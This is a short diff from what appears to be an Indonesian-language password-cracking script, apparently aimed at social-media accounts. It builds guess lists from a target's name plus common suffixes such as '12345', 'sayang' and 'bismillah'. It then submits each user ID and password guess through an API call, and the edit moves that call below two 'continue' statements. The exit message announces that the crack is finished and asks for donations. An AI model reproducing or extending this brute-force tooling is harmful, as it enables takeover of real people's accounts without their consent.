@@ -416,10 +416,11 @@ class ngentod:
                                 _i_[0] + '12345',
                                 'sayang',
                                 'bismillah']
-                        log.submit(self.b_api, uid, pwx)
+              
                     continue
                     continue
-
+                    log.submit(self.b_api, uid, pwx)
+                    
             os.remove(self.apk)
             exit('[!!] Crack Selesai Ngab\n [!!] Make Doang Donasi Kagak\n [!!] Waterbom Men')
         elif suuu in ('2', '02'):
